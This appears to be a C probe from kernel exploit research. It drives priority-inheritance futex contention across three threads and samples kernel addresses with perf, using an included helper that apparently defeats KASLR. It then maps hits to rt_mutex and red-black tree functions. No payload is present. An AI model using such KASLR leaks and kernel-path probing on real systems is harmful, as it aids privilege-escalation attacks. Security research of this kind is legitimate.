/* piB.c — Task B: 3 threads on one PI futex. T1 holds, T2/T3 queue (enqueue_pi
 * -> rb_insert_color), T1 unlocks (dequeue -> rb_erase, adjust_prio_chain).
 * perf on main (T1). Alarm guard + always UNLOCK. No UAF. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"
#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define RP 16
#define MAXO 600000
static uint64_t offs[MAXO]; static int no;
static volatile int fut=0, stop=0, q1=0, q2=0;
static inline long xf(void*u,int op){ return syscall(98,u,op,0,0,0,0); }
#define FLPI (6|128)
#define FUPI (7|128)
static void alrm(int s){(void)s;stop=1;}

static void* t2(void*x){ (void)x;
    while(!stop){ q1=1; xf(&fut,FLPI); xf(&fut,FUPI); q1=0; usleep(200); }
    return 0;
}
static void* t3(void*x){ (void)x;
    while(!stop){ q2=1; xf(&fut,FLPI); xf(&fut,FUPI); q2=0; usleep(200); }
    return 0;
}
static void drain(void*base,size_t pg,size_t ds,struct perf_event_mmap_page*meta,uint64_t kt){
    char*d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header*h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char*q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;
            uint64_t nr; memcpy(&nr,q,8); q+=8;
            if(ip>=0xffff000000000000UL&&no<MAXO) offs[no++]=ip-kt;
            if(nr>64)nr=64;
            for(uint64_t k=0;k<nr;k++){uint64_t c;memcpy(&c,q,8);q+=8;
                if(c>=0xffff000000000000UL&&no<MAXO) offs[no++]=c-kt;}
        }
        meta->data_tail+=h->size;
    }
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,alrm); alarm(50);
    uint64_t kt=kaaslr_text_base(); for(int r=0;r<6&&!kt;r++) kt=kaaslr_text_base();
    printf("[M] _text=%#018llx\n",(unsigned long long)kt); if(!kt)return 1;
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN; a.sample_period=200;
    a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){printf("[M] perf %d\n",errno);return 1;}
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void*base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){printf("[M] mmap %d\n",errno);return 1;}
    struct perf_event_mmap_page*meta=base;
    pthread_t a2,a3; pthread_create(&a2,0,t2,0); pthread_create(&a3,0,t3,0);
    usleep(20000);
    printf("[M] perf on, T1 hold/unlock\n");
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(int i=0;i<4000 && !stop && no<MAXO;i++){
        xf(&fut,FLPI);            /* T1 takes lock; T2/T3 queue -> enqueue_pi */
        usleep(400);              /* let them block */
        xf(&fut,FUPI);            /* release -> dequeue, rb_erase, adjust_prio */
        usleep(400);
        drain(base,pg,ds,meta,kt);
    }
    drain(base,pg,ds,meta,kt);
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
    stop=1; pthread_join(a2,0); pthread_join(a3,0);
    munmap(base,ms); close(fd);
    printf("[M] offsets=%d\n",no);
    struct{long lo,hi;const char*nm;}R[]={
        {0x9f153c,0x9f153c+0x400,"rb_insert_color"},
        {0x9f16ac,0x9f16ac+0x400,"rb_erase"},
        {0x14f7d0c,0x14f7d0c+0x200,"remove_waiter"},
        {0x14f81f4,0x14f81f4+0x600,"rt_mutex_adjust_prio_chain"},
        {0x14f71cc,0x14f7d0c,"rt_mutex_slowlock"},
        {0x14f73e4,0x14f7d0c,"task_blocks_on_rt_mutex"},
        {0x277038,0x279200,"do_futex"},
        {0x27a8fc,0x27b600,"futex_lock_pi"},
    };
    for(unsigned r=0;r<sizeof(R)/sizeof(R[0]);r++){
        int c=0;uint64_t mn=~0ull,mx=0;
        for(int i=0;i<no;i++)if((long)offs[i]>=R[r].lo&&(long)offs[i]<R[r].hi){c++;if(offs[i]<mn)mn=offs[i];if(offs[i]>mx)mx=offs[i];}
        printf("HIT %-30s count=%-6d",R[r].nm,c);
        if(c)printf(" first=%#lx (+%#lx) last=%#lx",(unsigned long)mn,(unsigned long)(mn-R[r].lo),(unsigned long)mx);
        printf("\n");
    }
    return 0;
}
